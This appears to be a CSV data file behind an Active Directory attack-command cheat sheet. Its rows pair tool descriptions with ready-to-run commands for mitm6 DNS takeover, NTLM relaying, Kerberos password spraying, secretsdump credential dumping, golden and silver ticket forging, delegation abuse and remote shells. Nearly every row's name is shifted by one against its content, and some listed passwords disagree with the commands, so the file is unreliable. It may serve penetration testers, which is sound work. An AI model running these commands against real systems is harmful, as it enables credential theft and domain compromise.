"NetExec-Enum-LDAP","mitm6 is a pentesting tool that exploits the default configuration of Windows to take over the default DNS server. It does this by replying to DHCPv6 messages, providing victims with a link-local IPv6 address and setting the attackers host as default DNS server. The following command will respond to DHCPv6 messages and set the DNS server to the attack host IP. Leverage this command with ntlmrelayx.py to capture the WPAD configuration requests.   Command Reference:  	Domain: test.local","mitm6 -d test.local --ignore-nofqnd","No_Creds","[''Linux''-|-''Windows'']","Exploitation","[''https://github.com/dirkjanm/mitm6''-|-''https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/'']","DNS","false"
"NetExec-Creds-coerce_plus","ldapsearch is a Linux based tool that opens a connection to an LDAP server, binds, and performs a search using specified parameters. The following command will attempt to find sensitive information (such as leaked creds), by querying all LDAP objects, essentially dumping all the data that an anonymous user can access.  Command Reference:  	Domain: test.local","ldapsearch -LLL -x -H ldap://test.local -b'' -s base '(objectclass=\*)'","No_Creds","Linux","Enumeration","https://linux.die.net/man/1/ldapsearch","LDAP","false"
"Mitm6","ldapsearch is a Linux based tool that opens a connection to an LDAP server, binds, and performs a search using specified parameters. The following command will attempt to find sensitive information (such as leaked creds), by querying all LDAP objects, essentially dumping all the data that an anonymous user can access.  Command Reference:  	Domain: test.local    	Username: ldap    	Password: password123","ldapsearch -h test.local -D 'ldap@test.local' -w password123 -b 'dc=test,dc=local'","[''Username''-|-''Password'']","Linux","Enumeration","https://linux.die.net/man/1/ldapsearch","LDAP","false"
"LDAPSearch-NoCreds","ropnop's kerbrute bruteforces and enumerates valid Active Directory accounts through Kerberos Pre-Authentication. The following command will attempt to enumerate valid usernames given a list of usernames to try.  Command Reference:  	Domain: test.local  	Username List: usernames.txt","kerbrute userenum -d test.local usernames.txt","No_Creds","[''Linux''-|-''Windows'']","Enumeration","https://github.com/ropnop/kerbrute","Kerberos","false"
"LDAPSearch-Creds","ropnop's kerbrute bruteforces and enumerates valid Active Directory accounts through Kerberos Pre-Authentication. The following command will perform a password spray account against a list of provided users given a password.  Command Reference:  	Domain: test.local  	Username List: domain_users.txt  	Password: password123","kerbrute passwordspray -d test.local domain_users.txt password123","Username","[''Linux''-|-''Windows'']","Enumeration","https://github.com/ropnop/kerbrute","Kerberos","false"
"Kerbrute-UserEnum","ropnop's kerbrute bruteforces and enumerates valid Active Directory accounts through Kerberos Pre-Authentication. The following command will bruteforce an account against a list of provided passwords given a username.  Command Reference:  	Domain: test.local  	Password List: passwords.txt  	Username: john","kerbrute bruteuser -d test.local passwords.txt john","Username","[''Linux''-|-''Windows'']","Enumeration","https://github.com/ropnop/kerbrute","Kerberos","false"
"Kerbrute-PasswordSpray","ropnop's kerbrute bruteforces and enumerates valid Active Directory accounts through Kerberos Pre-Authentication. The following command will attempt to brute force valid username and passwords logins given a list of credentials (in the format `username:password`).  Command Reference:  	Domain: test.local  	Credential List: credentials.txt","cat credentials.txt | kerbrute_linux_amd64 -d test.local bruteforce -","No_Creds","Linux","Enumeration","https://github.com/ropnop/kerbrute","Kerberos","false"
"Kerbrute-BruteUser","Impacket's getTGT.py uses a valid user's NTLM hash to request Kerberos tickets, in order to access any service or machine where that user has permissions.  Command Reference:  	Target IP: 10.10.10.1  	Domain: test.local  	Username: john  	Hash: 2a3de7fe356ee524cc9f3d579f2e0aa7","python3 getTGT.py test.local/john -dc-ip 10.10.10.1 -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7","[''Hash''-|-''Username'']","[''Linux''-|-''Windows'']","Exploitation","[''https://github.com/SecureAuthCorp/impacket/blob/master/examples/getTGT.py''-|-''https://www.tarlogic.com/en/blog/how-to-attack-kerberos/'']","Kerberos","false"
"Kerbrute-BruteForce","Impacket's getST.py will request a Service Ticket and save it as ccache. If the account has constrained delegation privileges, you can use the `-impersonate` flag to request a ticket on behalf of another user. The following command will impersonate the Administrator account using the hashed password of user `john` and request a Service Ticket on its behalf for the `www` service on host `server01.test.local`.  Command Reference:  	Target IP: 10.10.10.1  	Domain: test.local  	Service: www  	Host Name: server01.test.local  	Username: john  	Hash: :2a3de7fe356ee524cc9f3d579f2e0aa7  	Impersonated User: Administrator","python3 getST.py -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7 -spn www/server01.test.local -dc-ip 10.10.10.1 -impersonate Administrator test.local/john","[''Hash''-|-''Username'']","[''Linux''-|-''Windows'']","[''Exploitation''-|-''PrivEsc''-|-''Persistence'']","[''https://github.com/SecureAuthCorp/impacket/blob/master/examples/getST.py''-|-''http://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html'']","Kerberos","false"
"Impacket-getTGT","Impacket's getST.py will request a Service Ticket and save it as ccache. If the account has constrained delegation privileges, you can use the `-impersonate` flag to request a ticket on behalf of another user. The following command will impersonate the Administrator account and request a Service Ticket on its behalf for the `www` service on host `server01.test.local`.  Command Reference:  	Target IP: 10.10.10.1  	Domain: test.local  	Service: www  	Host Name: server01.test.local  	Username: john  	Password: password123  	Impersonated User: Administrator","python3 getST.py -spn www/server01.test.local -dc-ip 10.10.10.1 -impersonate Administrator test.local/john:password123","[''Username''-|-''Password'']","[''Linux''-|-''Windows'']","[''Exploitation''-|-''PrivEsc''-|-''Persistence'']","[''https://github.com/SecureAuthCorp/impacket/blob/master/examples/getST.py''-|-''http://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html'']","Kerberos","false"
"Impacket-getST-Hash","Impacket's atexec.py uses the Task Scheduler service on the remote Windows host to execute the given command. It will create a windows task with a random name, trigger the task, and then delete it. The following command executes `whoami` on the remote Windows host, authenticating with the hash of user `john`.  Command Reference:  	Target IP: 10.10.10.1  	Domain: test.local  	Username: john  	Hash: aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76  	Command Executed: whoami","python3 atexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 test.local/john@10.10.10.1 whoami","[''Hash''-|-''Username'']","[''Linux''-|-''Windows'']","Exploitation","[''https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py''-|-''https://u0041.co/blog/post/1'']","SMB","false"
"Impacket-getST-Creds","Impacket's atexec.py uses the Task Scheduler service on the remote Windows host to execute the given command. It will create a windows task with a random name, trigger the task, and then delete it. The following command executes `whoami` on the remote Windows host.  Command Reference:  	Target IP: 10.10.10.1  	Domain: test.local  	Username: john  	Password: password123  	Command Executed: whoami","python3 atexec.py test.local/john:password123@10.10.10.1 whoami","[''Password''-|-''Username'']","[''Linux''-|-''Windows'']","Exploitation","[''https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py''-|-''https://u0041.co/blog/post/1'']","SMB","false"
"Impacket-atexec-Hash","Impacket's addcomputer.py will add a computer account to the domain and set its password. The following command will create a new computer over the SMB by specifying the `SAMR` method.  Command Reference:  	Target IP: 10.10.10.1  	Domain: test.local  	New Computer Password: TestPassword123  	New Computer Name: testComputer  	Username: john  	Password: password123","python3 addcomputer.py -method SAMR -dc-ip 10.10.10.1 -computer-pass TestPassword321 -computer-name testComputer test.local/john:password123","[''Username''-|-''Password'']","[''Linux''-|-''Windows'']","[''Exploitation''-|-''Persistence'']","[''https://github.com/SecureAuthCorp/impacket/blob/master/examples/addcomputer.py''-|-''http://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html'']","SMB","false"
"Impacket-atexec-Creds","Impacket's addcomputer.py will add a computer account to the domain and set its password. The following command will create a new computer over LDAPS. Plain LDAP is not supported, as it doesn't allow setting the password of the new computer.  Command Reference:  	Target IP: 10.10.10.1  	Domain: test.local  	New Computer Password: TestPassword123  	New Computer Name: testComputer  	Username: john  	Password: password123","python3 addcomputer.py -method LDAPS -dc-ip 10.10.10.1 -computer-pass TestPassword321 -computer-name testComputer test.local/john:password123","[''Username''-|-''Password'']","[''Linux''-|-''Windows'']","[''Exploitation''-|-''Persistence'']","[''https://github.com/SecureAuthCorp/impacket/blob/master/examples/addcomputer.py''-|-''http://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html'']","LDAP","false"
"Impacket-addcomputer-SMB","Impacket's wmiexec.py uses the Windows Management Instrumentation (WMI) to give you an interactive shell on the Windows host.  Command Reference:  	Target IP: 10.10.10.1  	Domain: test.local  	Username: john  	Password: password123","python3 wmiexec.py test.local/john:password123@10.10.10.1","[''Password''-|-''Username'']","[''Linux''-|-''Windows'']","Exploitation","[''https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py''-|-''https://riccardoancarani.github.io/2020-05-10-hunting-for-impacket/#wmiexecpy'']","WMI","false"
"Impacket-addcomputer-LDAPS","Impacket's ticketer.py can perform Silver Ticket attacks, which crafts a valid TGS ticket for a specific service using a valid user's NTLM hash. It is then possible to gain access to that service. The following command crafts a TGS for the SMB service, which can then be used to gain a shell.  Command Reference:  	Target IP: 10.10.10.1  	Domain: test.local  	Username: john  	Hash: b18b4b218eccad1c223306ea1916885f  	Domain SID: S-1-5-21-1339291983-1349129144-367733775  	SMB Service: cifs","python3 ticketer.py -nthash b18b4b218eccad1c223306ea1916885f -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain test.local -dc-ip 10.10.10.1 -spn cifs/test.local john","[''Username''-|-''Hash'']","[''Linux''-|-''Windows'']","[''Exploitation''-|-''Persistence'']","[''https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py''-|-''https://www.tarlogic.com/en/blog/how-to-attack-kerberos/'']","Kerberos","false"
"Impacket-WMIExec","Impacket's services.py communicates with Windows services using the MSRPC interface. It can perform many different actions on any service.  Command Reference:  	Target IP: 10.10.10.1  	Domain: test.local  	Username: john  	Password: password123  	Action: list","python3 services.py test.local/john:password123@10.10.10.1 list","[''Password''-|-''Username'']","[''Linux''-|-''Windows'']","Enumeration","[''https://github.com/SecureAuthCorp/impacket/blob/master/examples/services.py''-|-''https://www.hackingarticles.in/impacket-guide-smb-msrpc/'']","RPC","false"
"Impacket-SilverTicket","Impacket's secretsdump.py will perform various techniques to dump secrets from the remote machine without executing any agent. Techniques include reading SAM and LSA secrets from registries, dumping NTLM hashes, plaintext credentials, and kerberos keys, and dumping NTDS.dit. The following command will attempt to dump all secrets from the target machine using the previously mentioned techniques.  Command Reference:  	Target IP: 10.10.10.1  	Domain: test.local  	Username: john  	Password: password123","python3 secretsdump.py test.local/john:password123@10.10.10.1","[''Password''-|-''Username'']","[''Linux''-|-''Windows'']","Exploitation","[''https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py''-|-''https://riccardoancarani.github.io/2020-05-10-hunting-for-impacket/#secretsdumppy'']","[''Kerberos''-|-''NTLM'']","false"
"Impacket-Services","Impacket's secretsdump.py will perform various techniques to dump secrets from the remote machine without executing any agent. Techniques include reading SAM and LSA secrets from registries, dumping NTLM hashes, plaintext credentials, and kerberos keys, and dumping NTDS.dit. The following command will attempt to use the specified machines NTDS.dit and system file to extract the user account hashes associated with that machine.  Command Reference:  	Target IP: 10.10.10.2  	Domain Controller: 10.10.10.1  	Domain: test.local  	Username: john  	Password: password123","python3 secretsdump.py -ntds C:\Windows\NTDS\ntds.dit -system C:\Windows\System32\Config\system -dc-ip 10.10.10.1 test.local/john:password123@10.10.10.2","[''Password''-|-''Username'']","[''Linux''-|-''Windows'']","Exploitation","[''https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py''-|-''https://riccardoancarani.github.io/2020-05-10-hunting-for-impacket/#secretsdumppy'']","[''Kerberos''-|-''NTLM'']","false"
"Impacket-SecretsDump","Impacket's smbexec.py. This will give you an interactive shell on the Windows host.  Command Reference:  	Target IP: 10.10.10.1  	Domain: test.local  	Username: john  	Password: password123","python3 smbexec.py test.local/john:password123@10.10.10.1","[''Password''-|-''Username'']","[''Linux''-|-''Windows'']","Exploitation","[''https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py''-|-''https://www.varonis.com/blog/insider-danger-stealthy-password-hacking-with-smbexec/'']","SMB","false"
"Impacket-SecretsDump-NTDS","Impacket's smbclient.py is a generic smbclient, allowing you to list shares and files, rename, upload and download files and create and delete directories.  Command Reference:  	Target IP: 10.10.10.1  	Domain: test.local  	Username: john  	Password: password123","python3 smbclient.py test.local/john:password123@10.10.10.1","[''Password''-|-''Username'']","[''Linux''-|-''Windows'']","Enumeration","[''https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbclient.py''-|-''https://www.hackingarticles.in/impacket-guide-smb-msrpc/'']","SMB","false"
"Impacket-SMBExec","Impacket's samrdump.py communicates with the Security Account Manager Remote (SAMR) interface to list system user accounts, available resource shares, and other sensitive information.  Command Reference:  	Target IP: 10.10.10.1  	Domain: test.local  	Username: john  	Password: password123","python3 samrdump.py test.local/john:password123@10.10.10.1","[''Password''-|-''Username'']","[''Linux''-|-''Windows'']","Enumeration","[''https://github.com/SecureAuthCorp/impacket/blob/master/examples/samrdump.py''-|-''https://www.hackingarticles.in/impacket-guide-smb-msrpc/'']","RPC","false"
"Impacket-SMBClient","Impacket's reg.py is a remote registry manipulation tool, providing similar functionality to reg.exe in Windows.  Command Reference:  	Target IP: 10.10.10.1  	Domain: test.local  	Username: john  	Password: password123","python3 reg.py test.local/john:password123@10.10.10.1 query -keyName HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows -s","[''Password''-|-''Username'']","[''Linux''-|-''Windows'']","[''Exploitation''-|-''Persistence'']","[''https://github.com/SecureAuthCorp/impacket/blob/master/examples/reg.py''-|-''https://www.hackingarticles.in/impacket-guide-smb-msrpc/'']","SMB","false"
"Impacket-SAMRDump","Impacket's rpcdump.py enumerates Remote Procedure Call (RPC) endpoints.  Command Reference:  	Target IP: 10.10.10.1  	Domain: test.local  	Username: john  	Password: password123","python3 rpcdump.py test.local/john:password123@10.10.10.1","[''Password''-|-''Username'']","[''Linux''-|-''Windows'']","Enumeration","[''https://github.com/SecureAuthCorp/impacket/blob/master/examples/rpcdump.py''-|-''https://www.hackingarticles.in/impacket-guide-smb-msrpc/'']","RPC","false"
"Impacket-Reg","Impacket rbcd.py will modify the msDS-AllowedToActOnBehalfOfOtherIdentity property of a target computer with security descriptor of another computer. The following command adds the related security descriptor of the created EVILCOMPUTER to the msDS-AllowedToActOnBehalfOfOtherIdentity property of DC01. This basically means that EVILCOMPUTER can get impersonated service tickets for DC01 using getST.py.  Command Reference:    Target IP: 10.10.10.1    Domain: test.local    Username: john    Hash: :A9FDFA038C4B75EBC76DC855DD74F0DA    Delegate To: DC01$    Delegate From: EVILCOMPUTER$","python3 rbcd.py -action write -delegate-to ""DC01$"" -delegate-from ""EVILCOMPUTER$"" -dc-ip 10.10.10.1 -hashes :A9FDFA038C4B75EBC76DC855DD74F0DA test.local/john","[''Username''-|-''Hash'']","[''Linux''-|-''Windows'']","[''Exploitation''-|-''PrivEsc''-|-''Persistence'']","[''https://github.com/SecureAuthCorp/impacket/blob/master/examples/rbcd.py''-|-''https://github.com/tothi/rbcd-attack'']","[''Kerberos''-|-''SMB''-|-''LDAP'']","false"
"Impacket-RPCDump","Impacket's psexec.py offers psexec like functionality. This will give you an interactive shell on the Windows host.  Command Reference:  	Target IP: 10.10.10.1  	Domain: test.local  	Username: john  	Password: password123","python3 psexec.py test.local/john:password123@10.10.10.1","[''Password''-|-''Username'']","[''Linux''-|-''Windows'']","Exploitation","[''https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py''-|-''https://www.sans.org/blog/psexec-python-rocks/'']","SMB","false"
"Impacket-RBCD","Impacket's psexec.py offers psexec like functionality. This will give you an interactive shell on the Windows host. psexec.py also allows using Service Tickets, saved as a ccache file for Authentication. It can be obtained via Impacket's GetST.py  Command Reference:  	Target IP: 10.10.10.1  	Domain: test.local  	Username: john","export KRB5CCNAME=/full/path/to/john.ccache; python3 psexec.py test.local/john@10.10.10.1 -k -no-pass","[''TGS''-|-''Username'']","[''Linux''-|-''Windows'']","Exploitation","[''https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py''-|-''https://www.sans.org/blog/psexec-python-rocks/''-|-''https://book.hacktricks.xyz/windows/active-directory-methodology/pass-the-ticket#pass-the-ticket-attack'']","SMB","false"
"Impacket-PsExec","Impacket's ntlmrelayx.py performs NTLM Relay Attacks, creating an SMB and HTTP server and relaying credentials to various different protocols (SMB, HTTP, LDAP, etc.).  The below command creates an SMB relay server that targets the IP 10.10.10.1, meaning any credentials that the SMB server recieves, gets relayed to that IP to attempt to authenticate and execute 'whoami /all'. In order for the SMB server to recieve credentials to relay, dementor.py can be used to trigger a forced authentication from the IP it's targeting to an attacker controlled SMB server.  Command Reference:  	Target IP: 10.10.10.1","python3 ntlmrelayx.py -smb2support -t smb://10.10.10.1 -c 'whoami /all' -debug","No_Creds","[''Linux''-|-''Windows'']","Exploitation","[''https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py''-|-''https://www.praetorian.com/blog/active-directory-computer-account-smb-relaying-attack'']","NTLM","false"
"Impacket-PsExec-PassTheTicket","Impacket's ntlmrelayx.py performs NTLM Relay Attacks, creating an SMB and HTTP server and relaying credentials to various different protocols (SMB, HTTP, LDAP, etc.).  The below command will perform WPAD spoofing to force the victim machine to authenticate to the attacker controlled host. The command will then relay the authentication to create a new computer object and grant it delegation rights to impersonate users on the victim machine. This command should be used in conjunction with mitm6.  Command Reference:  	Target Domain Controller: dc.test.local","python3 ntlmrelayx.py -t ldaps://dc.test.local -wh test-wpad --delegate-access","No_Creds","[''Linux''-|-''Windows'']","Exploitation","[''https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py''-|-''https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/'']","[''NTLM''-|-''LDAP'']","false"
"Impacket-NTLMRelayX","Impacket's ntlmrelayx.py performs NTLM Relay Attacks, creating an SMB and HTTP server and relaying credentials to various different protocols (SMB, HTTP, LDAP, etc.).  The below command creates an SMB relay server that targets the IP 10.10.10.1, meaning any credentials that the SMB server recieves, gets relayed to that IP to attempt to authenticate and create a socks connection to the host. In order for the SMB server to recieve credentials to relay, dementor.py or Petitpotam can be used to trigger a forced authentication from the IP it's targeting to an attacker controlled SMB server.  Command Reference:  	Target IP: 10.10.10.1","python3 ntlmrelayx.py -smb2support -t smb://10.10.10.1 -socks","No_Creds","[''Linux''-|-''Windows'']","Exploitation","[''https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py''-|-''https://www.praetorian.com/blog/active-directory-computer-account-smb-relaying-attack'']","[''NTLM''-|-''SMB'']","false"
"Impacket-NTLMRelayX-WPAD","Impacket's lookupsid.py performs bruteforcing of Windows SID's to identify users/groups on the remote target.  Command Reference:  	Target IP: 10.10.10.1  	Domain: test.local  	Username: john  	Password: password123","python3 lookupsid.py test.local/john:password123@10.10.10.1","[''Password''-|-''Username'']","[''Linux''-|-''Windows'']","Enumeration","[''https://github.com/SecureAuthCorp/impacket/blob/master/examples/lookupsid.py''-|-''https://www.puckiestyle.nl/impacket/'']","RPC","false"
"Impacket-NTLMRelayX-Socks","Impacket's ticketer.py can perform Golden Ticket attacks, which crafts a valid TGT ticket using a valid user's NTLM hash. It is then possible to access any service using the TGT by requesting a TGS for that service.  Command Reference:  	Target IP: 10.10.10.1  	Domain: test.local  	Username: john  	Hash: b18b4b218eccad1c223306ea1916885f  	Domain SID: S-1-5-21-1339291983-1349129144-367733775","python3 ticketer.py -nthash b18b4b218eccad1c223306ea1916885f -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain test.local -dc-ip 10.10.10.1 john","[''Username''-|-''Hash'']","[''Linux''-|-''Windows'']","[''Exploitation''-|-''Persistence'']","[''https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py''-|-''https://www.tarlogic.com/en/blog/how-to-attack-kerberos/'']","Kerberos","false"
"Impacket-LookUpSID","Impacket's GetUserSPNs.py will attempt to fetch Service Principal Names that are associated with normal user accounts. What is returned is a ticket that is encrypted with the user account's password, which can then be bruteforced offline.  Command Reference:  	Target IP: 10.10.10.1  	Domain: test.local  	Username: john  	Password: password123","python3 GetUserSPNs.py test.local/john:password123 -dc-ip 10.10.10.1 -request","[''Password''-|-''Username'']","[''Linux''-|-''Windows'']","Exploitation","[''https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py''-|-''https://www.tarlogic.com/en/blog/how-to-attack-kerberos/'']","Kerberos","false"
"Impacket-GoldenTicket","Impacket's GetNPUsers.py will attempt to harvest the non-preauth AS_REP responses for a given list of usernames. These responses will be encrypted with the user's password, which can then be cracked offline.  Command Reference:  	Target IP: 10.10.10.1  	Domain: test.local  	Username List: usernames.txt  	Output File: hashes.txt","python3 GetNPUsers.py test.local/ -dc-ip 10.10.10.1 -usersfile usernames.txt -format hashcat -outputfile hashes.txt","Username","[''Linux''-|-''Windows'']","Exploitation","[''https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py''-|-''https://www.tarlogic.com/en/blog/how-to-attack-kerberos/'']","Kerberos","false"
"Impacket-GetUserSPNs","Impacket's GetADUsers.py will attempt to gather data about the domain's users and their corresponding email addresses.  Command Reference:  	Target IP: 10.10.10.1  	Domain: test.local  	Username: john  	Password: password123","python3 GetADUsers.py -all test.local/john:password123 -dc-ip 10.10.10.1","[''Username''-|-''Password'']","[''Linux''-|-''Windows'']","Enumeration","https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetADUsers.py","Kerberos","false"
"Impacket-GetNPUsers","Python script to automatically extract and decrypt Group Policy Preferences (GPP) passwords using streams for carving files instead of mounting shares  Command Reference:  	Target IP: 10.10.10.1  	Domain: test.local  	Username: john  	Password: password123","python3 Get-GPPPassword.py 'TEST.local/john:password123@DC01.TEST.local' -dc-ip 10.10.10.1","[''Password''-|-''Username''-|-''Hash'']","[''Linux''-|-''Windows'']","[''Exploitation''-|-''Enumeration'']","[''https://github.com/SecureAuthCorp/impacket/blob/master/examples/Get-GPPPassword.py''-|-''https://podalirius.net/en/articles/exploiting-windows-group-policy-preferences/'']","SMB","false"
"Impacket-GetADUsers","Impacket's dcomexec.py provides an interactive shell on the Windows host similar to wmiexec.py, but using varying DCOM endpoints.  Currently supports MMC20.Application, ShellWindows, and ShellBrowserWindow DCOM objects.  Command Reference:  	Target IP: 10.10.10.1  	Domain: test.local  	Username: john  	Password: password123  	DCOM Object: MMC20","python3 dcomexec.py -object MMC20 test.local/john:password123@10.10.10.1","[''Password''-|-''Username'']","[''Linux''-|-''Windows'']","Exploitation","[''https://github.com/SecureAuthCorp/impacket/blob/master/examples/dcomexec.py''-|-''https://riccardoancarani.github.io/2020-05-10-hunting-for-impacket/'']","DCOM","false"
"Impacket-Get-GPPPassword","The script FindUncommonShares.py is a Python equivalent of PowerView's Invoke-ShareFinder.ps1 allowing to quickly find uncommon shares in vast Windows Domains.  Command Reference:  	Target IP: 10.10.10.1  	Attacker IP: 10.10.10.2  	Domain: test.local  	Username: john  	Password: password123","python3 FindUncommonShares.py -u 'john' -d 'TEST.local' -p 'password123' --dc-ip 10.10.10.1","[''Password''-|-''Username''-|-''Hash'']","[''Linux''-|-''Windows'']","Enumeration","https://github.com/p0dalirius/FindUncommonShares","SMB","false"
"Impacket-DCOMExec","Evil-WinRM uses the Windows Management Instrumentation (WMI) to give you an interactive shell on the Windows host. Winrm Supports PKINIT, meaning if you have a computers PFX file, you can authenticate and get a shell. Note that the command requires a public and a private key in PEM format, that can be extracted by converting the PFX to PEM format. Take a look at the references for more info on that. Password protected PFX files can be cracked with JohnTheRipper.  Command Reference:  	Target IP: 10.10.10.1  	PFX File: cert.pfx  	Domain: EVILCORP","evil-winrm -i 10.10.10.1 -c pub.pem -k priv.pem -S -r EVILCORP","PFX","Windows","Exploitation","[''https://github.com/Hackplayers/evil-winrm''-|-''https://book.hacktricks.xyz/cryptography/certificates'']","WMI","false"
"FindUncommonShares","Evil-WinRM uses the Windows Management Instrumentation (WMI) to give you an interactive shell on the Windows host.  Command Reference:  	Target IP: 10.10.10.1  	Username: john  	Password: password123","evil-winrm -i 10.10.10.1 -u john -p password123","[''Password''-|-''Username'']","[''Linux''-|-''Windows'']","Exploitation","https://github.com/Hackplayers/evil-winrm","WMI","false"
"Evil-Winrm-PKINIT","Evil-WinRM uses the Windows Management Instrumentation (WMI) to give you an interactive shell on the Windows host. Evil-WinRM supports passing the victim's NT hash for authorization.  Command Reference:  	Target IP: 10.10.10.1  	Username: john  	NT Hash: c23b2e293fa0d312de6f59fd6d58eae3","evil-winrm -i 10.10.10.1 -u john -H c23b2e293fa0d312de6f59fd6d58eae3","[''Username''-|-''Hash'']","[''Linux''-|-''Windows'']","Exploitation","https://github.com/Hackplayers/evil-winrm","WMI","false"
"Evil-WinRM","Enum4Linux is a tool for enumerating information from Windows and Samba systems, using a number of different techniques. The following command will attempt to enumerate information using no credentials.  Command Reference:  	Target IP: 10.10.10.1","enum4linux -a 10.10.10.1","No_Creds","Linux","Enumeration","https://github.com/CiscoCXSecurity/enum4linux","","false"
"Evil-WinRM-PTH","Enum4Linux is a tool for enumerating information from Windows and Samba systems, using a number of different techniques. The following command will attempt to enumerate information provided valid login credentials.  Command Reference:  	Target IP: 10.10.10.1  	Username: john  	Password: password123","enum4linux -u john -p password123 -a 10.10.10.1","[''Username''-|-''Password'']","Linux","Enumeration","https://github.com/CiscoCXSecurity/enum4linux","","false"
"Enum4Linux-NoCreds","dementor.py interacts with the printer spooler on a host to trigger an authentication from the target IP to an attacker controlled host (usually an SMB or HTTP server). This captured authentication can then be relayed to authenticated to other hosts. See more in ntlmrelayx.py.  Command Reference:  	Target IP: 10.10.10.1  	Attacker IP: 10.10.10.2  	Domain: test.local  	Username: john  	Password: password123","python3 dementor.py -u john -p password123 -d test.local 10.10.10.2 10.10.10.1","[''Password''-|-''Username'']","[''Linux''-|-''Windows'']","Exploitation","[''https://gist.github.com/3xocyte/cfaf8a34f76569a8251bde65fe69dccc''-|-''https://www.praetorian.com/blog/active-directory-computer-account-smb-relaying-attack'']","[''RPC''-|-''NTLM'']","false"
"Enum4Linux-Creds","The lsass Process while great, is no where neaar the only way to dump credintials from windows. One of which is access the three registry hives: SAM, SYSTEM, and SECURITY. This is a method that can be used to dump credentials without mimikatz as well as offer some potenial stealth.","# The following command will dump the SAM, SYSTEM, and SECURITY hives to the current directory. reg save HKLM\SAM sam.hive reg save HKLM\SYSTEM system.hive reg save HKLM\SECURITY security.hive  #Assuming you have transfered the hives to your kali samdump2 system sam   #We can also get lsa secrets via mimikatz lsadump::secrets /system:c:\temp\system.hive /security:c:\temp\security.hive","[''Shell''-|-''PrivEsc''-|-''Exploitation'']","[''Windows''-|-''Linux'']","","[''https://www.ired.team/offensive-security/credential-access-and-credential-dumping''-|-''https://www.synacktiv.com/en/publications/lsa-secrets-revisiting-secretsdump'']","","false"
"Dementor","BloodHound is a single page Javascript web application, built on top of Linkurious, compiled with Electron, with a Neo4j database fed by a data collector. BloodHound uses graph theory to reveal the hidden and often unintended relationships within an Active Directory environment. Attackers can use BloodHound to easily identify highly complex attack paths that would otherwise be impossible to quickly identify. Defenders can use BloodHound to identify and eliminate those same attack paths. Both blue and red teams can use BloodHound to easily gain a deeper understanding of privilege relationships in an Active Directory environment.  BloodHound.py is a Python based ingestor for BloodHound, based on Impacket. It allows you to remotely collect data for bloodhound by querying LDAP  Command Reference:  	Target IP: 10.10.10.1  	Domain: test.local","bloodhound.py -d test.local -v --zip -c All -dc test.local -ns 10.10.10.1","No_Creds","[''Linux''-|-''Windows'']","Enumeration","[''https://github.com/BloodHoundAD/BloodHound''-|-''https://github.com/fox-it/BloodHound.py'']","LDAP","false"
"CredDumpWithoutMimilkatz","BloodHound is a single page Javascript web application, built on top of Linkurious, compiled with Electron, with a Neo4j database fed by a data collector. BloodHound uses graph theory to reveal the hidden and often unintended relationships within an Active Directory environment. Attackers can use BloodHound to easily identify highly complex attack paths that would otherwise be impossible to quickly identify. Defenders can use BloodHound to identify and eliminate those same attack paths. Both blue and red teams can use BloodHound to easily gain a deeper understanding of privilege relationships in an Active Directory environment.  BloodHound.py is a Python based ingestor for BloodHound, based on Impacket. It allows you to remotely collect data for bloodhound by querying LDAP  Command Reference:  	Target IP: 10.10.10.1  	Username: john  	Password: password123  	Domain: test.local","bloodhound.py -u john -p password123 -d test.local -v --zip -c All -dc test.local -ns 10.10.10.1","[''Username''-|-''Password'']","[''Linux''-|-''Windows'']","Enumeration","[''https://github.com/BloodHoundAD/BloodHound''-|-''https://github.com/fox-it/BloodHound.py'']","LDAP","false"
"BloodHound.py-Remote-Ingestion","Active Directory Certifcate Services or ADCS provide an alternative way to authenticate within a AD enviroment that contains a PKI as well as  being configured with a Certifcate Authority. References below will provide technical info on ADCS as well as exploitation techniques from  spectorops certfied preowned white paper.","#Note that we are just enumarating here. We are not preforming exploitation. There is a linux equalivent called certipy that works much the same way # Find CAs  C:Tools\Certify.exe cas   # Find templates C:Tools\Certify.exe find   # Find vulnerable templates C:Tools\Certify.exe find /vulnerable","Shell","Windows","Enumeration","[''https://github.com/GhostPack/Certify''-|-''https://posts.specterops.io/certified-pre-owned-d95910965cd2''-|-''https://www.thehacker.recipes/ad/movement/adcs/'']","","false"
